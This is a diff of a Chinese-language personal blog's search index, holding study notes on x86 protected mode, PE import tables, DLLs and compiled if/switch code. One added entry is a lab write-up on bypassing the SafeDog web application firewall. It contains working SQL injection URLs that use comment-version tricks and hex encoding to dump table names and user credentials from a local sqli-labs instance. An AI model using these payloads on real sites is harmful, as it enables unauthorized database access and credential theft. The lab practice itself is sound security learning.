class="comment">//结果为B1 --&gt; 10110 0 01 --&gt; RPL == 1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>保护模式</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>过安全狗笔记</title>
+    <url>/2020/08/11/%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<blockquote>
+<p>0x00 起因</p>
+</blockquote>
+<p>今天顾总给我们演示了如何过狗注入，嘻嘻嘻，当然要自己来一遍,当作交作业,嘻嘻嘻</p>
+<a id="more"></a>
+<blockquote>
+<p>0x01 开始</p>
+</blockquote>
+<p>测试点: sqli-lab Less-2</p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1</code></p>
+<p><img src="https://i.loli.net/2020/08/11/KJdw1ZkQmYno7HL.png" alt="1.png"></p>
+<p>既然看了顾总的演示,第一步的order by当然要改成group by,成功探测只有三个</p>
+<p>之后便是绕掉<code>SELECT</code>关键字,这里顾总说的是用<code>/*! */</code>注释绕掉成功,这里给44344点赞</p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!44344select*/ 1,2,3 limit 1,1 --+</code></p>
+<p><img src="https://i.loli.net/2020/08/11/dwyAWuFgOzPY9pt.png" alt="2.png"></p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database()*/,/*!44190user()*/</code></p>
+<p>之后发现database()怎么都绕不过,我不知道我是不是演示的时候画面卡没注意这个细节,所以分别试了绕database和(),然后用<code>/*!44190database/*!()*/*/</code></p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/*/,/*!44190user/*!()*/*/</code></p>
+<p>又爆语法错误,看了半天错误信息发现多了<code>*/</code>然后直接删掉括号后一个后成功</p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=0 union /*!44344select*/ 1,/*!44190database/*!()*/,/*!44190user/*!()*/</code></p>
+<p><img src="https://i.loli.net/2020/08/11/K7MWNeQ1F4cTvsy.png" alt="3.png"></p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(table_name),3 /*!25244from*/ information_schema.tables where table_schema=/*!44190database/*!()*/ limit 1,1 -- jsij</code></p>
+<p>爆表名成功</p>
+<p><img src="https://i.loli.net/2020/08/11/SDd8AnEi2pTfkCr.png" alt="4.png"></p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name= &#39;users &#39; limit 1,1 -- jsij</code></p>
+<p><img src="https://i.loli.net/2020/08/11/bWsE87KfT2GANSu.png" alt="5.png"></p>
+<p>卧槽,明明没有错</p>
+<p><img src="https://i.loli.net/2020/08/11/pOoEL9f4JPjyHkY.png" alt="6.png"></p>
+<p>不过很明显输出多了两个<code>/</code>嗯,绕了绕过不去,再看了源码,不过没有转义的函数,不过还是应该是sql把单引号转义掉了,就把<code>users</code>Hex转义成<code>0x7573657273</code>之后测试成功</p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(column_name),3 /*!25244from*/ information_schema.columns where table_name=0x7573657273 limit 1,1 -- jsij</code></p>
+<p><img src="https://i.loli.net/2020/08/11/o3WipwlJPk659LT.png" alt="7.png"></p>
+<p>再来查字段,成功</p>
+<p><code>http://192.168.133.132/sqli/Less-2/?id=1 union /*!20444select*/ 1,group_concat(username,0x3a,password),3 /*!25244from*/ users limit 1,1 -- jsij</code></p>
+<p><img src="https://i.loli.net/2020/08/11/ihqX5F6JVBYsvbm.png" alt="8.png"></p>
+<blockquote>
+<p>0x02 后记</p>
+</blockquote>
+<p>虽然只是复现了顾总的操作,不过依旧很多坑,非常难受</p>
+<p><img src="https://i.loli.net/2020/08/11/x126Eko5g34Dcrl.png" alt="9.png"></p>
+<p>还是这么多条记录,不过幸不辱命还是完成了</p>
+<p>不过这里转义单引号这个事,原因是当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。PHP 5.4 之前 PHP 指令 magic_quotes_gpc 默认是 on.</p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>陷阱门练习</title>
+    <url>/2021/02/06/%E9%99%B7%E9%98%B1%E9%97%A8%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="0x00-陷阱门练习"><a href="#0x00-陷阱门练习" class="headerlink" title="0x00 陷阱门练习"></a>0x00 陷阱门练习</h1><p>首先是看陷阱门在IDT表中的描述符</p>
+<p>可见陷阱门和中断门的区别在描述符上仅仅在于第8位是否为1</p>
+<a id="more"></a>
+
+<p><img src="https://i.loli.net/2021/02/06/V3QIiyk1Nc5RGhZ.png" alt="image-20210206225147250"></p>
+<p>而在使用上与中断门的区别仅仅只是中断门会将eflags的IF位清0，而陷阱门不会</p>
+<p>下面进行实验</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD a_eflags, i_eflags, t_eflags;</span><br><span class="line"></span><br><span class="line">DWORD data;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">InterruptGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov i_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">TrapGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm </span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov t_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov a_eflags,ebx</span><br><span class="line">		popfd</span><br><span class="line">        <span class="keyword">int</span> <span class="number">0x20</span> <span class="comment">//Call InterruptGate</span></span><br><span class="line">		<span class="keyword">int</span> <span class="number">0x21</span> <span class="comment">//Call TrapGate</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;after: %x \ninterrupt: %x \ntrap: %x\n&quot;</span>,a_eflags,i_eflags,t_eflags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里结果是</p>
+<blockquote>
+<p>after: 216  –&gt; 0010 0001 0110</p>
+<p>interrupt: 16 –&gt; 0000 0001 0110</p>
+<p>trap: 216 –&gt; 0010 0001 0110</p>
+</blockquote>
+<p> 很明显，第9位被清0</p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>保护模式</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>在VMware Player 15中安装MacOS</title>
     <url>/2020/03/02/%E5%9C%A8VMware-Player-15%E4%B8%AD%E5%AE%89%E8%A3%85MacOS/</url>
     <content><![CDATA[<h1 id="0x0-安装前准备"><a href="#0x0-安装前准备" class="headerlink" title="0x0 安装前准备"></a>0x0 安装前准备</h1><blockquote>
@@ -849,186 +1058,6 @@
 ]]></content>
       <tags>
         <tag>黑苹果</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>导入表学习笔记</title>
-    <url>/2021/01/27/%E5%AF%BC%E5%85%A5%E8%A1%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="导入表学习笔记"><a href="#导入表学习笔记" class="headerlink" title="导入表学习笔记"></a>导入表学习笔记</h1><hr>
-<h2 id="0x00-导入表概述"><a href="#0x00-导入表概述" class="headerlink" title="0x00 导入表概述"></a>0x00 导入表概述</h2><p>当程序使用非自身文件所写的函数，比如MessageBox的时候，这时候是从外界引了user32.dll里的函数。当程序使用了动态链接库里的函数时，编译和链接后的这些信息都会写入PE结构的导入表里。而我们的程序也是通过导入表来告诉操作系统这些函数该在哪去找。</p>
-<a id="more"></a>
-
-<p>而导入表则是位于IMAGE_DIRECTORY_ENTRY_IMPORT的第2项，而第2项指向的仍是一个数组。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics; <span class="comment">//通常为0</span></span><br><span class="line">        DWORD   OriginalFirstThunk;</span><br><span class="line">    &#125;;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    DWORD   ForwarderChain;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
-<p>然后我们来看几个重要点的值</p>
-<ol>
-<li><p><code>DWORD   OriginalFirstThunk;</code>为INT表，是一个RVA指向了一个<code>PIMAGE_THUNK_DATA</code>结构</p>
-<p>当<code>PIMAGE_THUNK_DATA</code>的最高位为1时为一个序号，是一个以序号导出的函数的导出序号        </p>
-</li>
-</ol>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PBYTE  ForwarderString;</span><br><span class="line">        PDWORD Function;</span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        PIMAGE_IMPORT_BY_NAME  AddressOfData;</span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
-<pre><code>当`PIMAGE_THUNK_DATA`的最高位为0时为一个RVA指针，而里面存的是RVA且指向`_IMAGE_IMPORT_BY_NAME`结构</code></pre>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
-<pre><code>且其中Hint为序号，不一定是导出序号，大部分的编译器置0；而Name则是指向函数名称首字符。</code></pre>
-<ol start="2">
-<li><p><code>DWORD   TimeDateStamp; </code>为时间戳</p>
-<p>当时间戳为0时表示为该dll未绑定</p>
-<p>当时间戳不为0时则该dll已被绑定，且时间戳于dll的时间戳相同（New Bound），如果不同则绑定已过期（Old Bound）</p>
-</li>
-<li><p><code>DWORD   Name;</code>为dll的文件名的地址(RVA)</p>
-</li>
-<li><p><code>DWORD   FirstThunk; </code>IAT表，在文件中值与INT表相同，在内存中载入后则为函数的真实地址(RVA)；如果该dll已绑定，则该值为该dll函数的真实地址</p>
-</li>
-</ol>
-<h2 id="0x01-导入表基本图解"><a href="#0x01-导入表基本图解" class="headerlink" title="0x01 导入表基本图解"></a>0x01 导入表基本图解</h2><p><img src="https://i.loli.net/2021/01/26/Uc8ZDgwiV5ldFWq.png" alt="image-20210126011214938"></p>
-<p><img src="https://i.loli.net/2021/01/26/Jiuf29PLQv8Hyw1.png" alt="image-20210126011353615"></p>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>简单使用链接库</title>
-    <url>/2020/01/20/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
-    <content><![CDATA[<h1 id="使用静态链接库"><a href="#使用静态链接库" class="headerlink" title="使用静态链接库"></a>使用静态链接库</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TestLib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestLib.lib&quot;</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">在项目 <span class="built_in">set</span> &gt; link 里添加相应lib文件，需申明头文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>静态链接库:把代码静态编译到exe中，更改lib内容就得重新编译使用</p>
-</blockquote>
-<hr>
-<h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><h2 id="链接库头文件写法"><a href="#链接库头文件写法" class="headerlink" title="链接库头文件写法"></a>链接库头文件写法</h2><h3 id="使用-declspec-dllexport"><a href="#使用-declspec-dllexport" class="headerlink" title="使用_declspec(dllexport)"></a>使用<code>_declspec(dllexport)</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="comment">//extern 申明为全局</span></span><br><span class="line"><span class="comment">//&quot;C&quot; 申明以C的语法处理，避免编译器无法判断处理方式把函数魔性改名</span></span><br><span class="line"><span class="comment">//_declspec(dllexport) 申明函数将导出</span></span><br></pre></td></tr></table></figure>
-<h3 id="使用-def"><a href="#使用-def" class="headerlink" title="使用.def"></a>使用<code>.def</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FuncList.def</span></span><br><span class="line">EXPORT</span><br><span class="line"></span><br><span class="line">Func @<span class="number">12</span> (NONAME)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="引用写法"><a href="#引用写法" class="headerlink" title="引用写法"></a>引用写法</h2><h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestDLL.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="显式链接"><a href="#显式链接" class="headerlink" title="显式链接"></a>显式链接</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lpFunc)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>; <span class="comment">//申明函数指针</span></span><br><span class="line"></span><br><span class="line">	lpFunc myFun; <span class="comment">//创建指针</span></span><br><span class="line"></span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;TestDLL.dll&quot;</span>); <span class="comment">//载入dll</span></span><br><span class="line"></span><br><span class="line">	myFun = (lpFunc)GetProcAddress(hModule, <span class="string">&quot;Func&quot;</span>); <span class="comment">//把指针指向dll内函数的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>浅谈if/switch的&quot;效率革命&quot;</title>
-    <url>/2019/12/06/%E6%B5%85%E8%B0%88switch-if/</url>
-    <content><![CDATA[<p>效率似乎是个或远或近的词，对于许多人来说，在如此快速的今天，似乎不太重视那肉眼不可分的损耗。每个人都有自己的”傲慢与偏见”，而就在这里让我们回过头来看一看某些被我们忽略的一些小细节。</p>
-<p>流程对于我们日常生活来说并不陌生，或许一条道走到黑的日子并不是丰富多彩。这时条件分支便给我们提供了更加灵活的可能。</p>
-<a id="more"></a>
-<p>便会有类似于这种的if语句</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>或许c代码许多人已经烂熟于心了，那就看看汇编代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">0040102F   mov         eax,1</span><br><span class="line">00401034   test        eax,eax</span><br><span class="line">00401036   je          main+2Fh (0040103f)</span><br><span class="line">00401038   mov         dword ptr [ebp-4],1</span><br></pre></td></tr></table></figure>
-<p>可以发现if的实现就是对于表达式值的一个比较，当不满足后便用jmp直接跳转</p>
-<p>再来看看if-else语句</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>c部分就不再多解释，直接跳到汇编</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">&#x2F;&#x2F;a变量的值扔进eax</span><br><span class="line"></span><br><span class="line">0040102F   cmp         dword ptr [ebp-4],1</span><br><span class="line">00401033   jne         main+2Eh (0040103e)</span><br><span class="line">&#x2F;&#x2F;与1比较，如果不等于1就跳到else语句处</span><br><span class="line">00401035   mov         dword ptr [ebp-4],1 &#x2F;&#x2F;if语句内的功能语句</span><br><span class="line">0040103C   jmp         main+35h (00401045)</span><br><span class="line">&#x2F;&#x2F;跳出if语句</span><br><span class="line"></span><br><span class="line">0040103E   mov         dword ptr [ebp-4],2&#x2F;&#x2F;else语句内的功能语句</span><br></pre></td></tr></table></figure>
-<p>对于if-else来说依旧是使用判断跳转的方式去处理条件分支，</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>:       DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span></span><br><span class="line"><span class="number">22</span>:</span><br><span class="line"><span class="number">23</span>:       <span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line"><span class="number">0040102F</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">00401033</span>   jne         main+<span class="number">53</span>h (<span class="number">00401063</span>)</span><br><span class="line"><span class="number">24</span>:       &#123;</span><br><span class="line"><span class="number">25</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401035</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">26</span>:           <span class="keyword">if</span>( a == <span class="number">2</span>)</span><br><span class="line"><span class="number">0040103</span>C   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401040</span>   jne         main+<span class="number">3B</span>h (<span class="number">0040104b</span>)</span><br><span class="line"><span class="number">27</span>:           &#123;</span><br><span class="line"><span class="number">28</span>:               a = <span class="number">2</span>;</span><br><span class="line"><span class="number">00401042</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">29</span>:           &#125;</span><br><span class="line"><span class="number">30</span>:           <span class="keyword">else</span> <span class="keyword">if</span>(a == <span class="number">4</span>)</span><br><span class="line"><span class="number">00401049</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">0040104B</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">0040104F</span>   jne         main+<span class="number">4</span>Ah (<span class="number">0040105</span>a)</span><br><span class="line"><span class="number">31</span>:           &#123;</span><br><span class="line"><span class="number">32</span>:               a = <span class="number">4</span>;</span><br><span class="line"><span class="number">00401051</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">33</span>:           &#125;</span><br><span class="line"><span class="number">34</span>:           <span class="keyword">else</span></span><br><span class="line"><span class="number">00401058</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">35</span>:           &#123;</span><br><span class="line"><span class="number">36</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040105</span>A   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">37</span>:           &#125;</span><br><span class="line"><span class="number">38</span>:       &#125;</span><br><span class="line"><span class="number">39</span>:       <span class="keyword">else</span></span><br><span class="line"><span class="number">00401061</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">40</span>:       &#123;</span><br><span class="line"><span class="number">41</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401063</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">42</span>:           <span class="keyword">if</span> (a/<span class="number">10</span><span class="number">-2</span>+<span class="number">7</span>)</span><br><span class="line"><span class="number">0040106</span>A   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0040106</span>D   cdq</span><br><span class="line"><span class="number">0040106</span>E   mov         ecx,<span class="number">0</span>Ah</span><br><span class="line"><span class="number">00401073</span>   idiv        eax,ecx</span><br><span class="line"><span class="number">00401075</span>   add         eax,<span class="number">5</span></span><br><span class="line"><span class="number">00401078</span>   test        eax,eax</span><br><span class="line"><span class="number">0040107</span>A   je          main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">43</span>:           &#123;</span><br><span class="line"><span class="number">44</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040107</span>C   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">45</span>:           &#125;</span><br><span class="line"><span class="number">46</span>:       &#125;</span><br></pre></td></tr></table></figure>
-<h2 id="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"><a href="#同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句" class="headerlink" title="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"></a>同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">00401039</span>   je          main+<span class="number">39</span>h (<span class="number">00401049</span>)</span><br><span class="line"><span class="number">0040103B</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">1</span></span><br><span class="line"><span class="number">0040103F</span>   je          main+<span class="number">48</span>h (<span class="number">00401058</span>)</span><br><span class="line"><span class="number">00401041</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401045</span>   je          main+<span class="number">57</span>h (<span class="number">00401067</span>)</span><br><span class="line"><span class="number">00401047</span>   jmp         main+<span class="number">66</span>h (<span class="number">00401076</span>)</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401049</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">E   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401053   add         esp,4</span><br><span class="line"><span class="number">00401056</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401058</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040105</span><span class="function">D   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401062   add         esp,4</span><br><span class="line"><span class="number">00401065</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401067</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040106</span><span class="function">C   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401071   add         esp,4</span><br><span class="line"><span class="number">00401074</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">15</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401076</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">0040107B</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401080   add         esp,4</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">17</span>:       &#125;</span><br></pre></td></tr></table></figure>
-<p>看到这有人可能会说：欸，这也不是比较比较然后跳转吗，不和if一个套路吗？<br>不过当分支一多比如：</p>
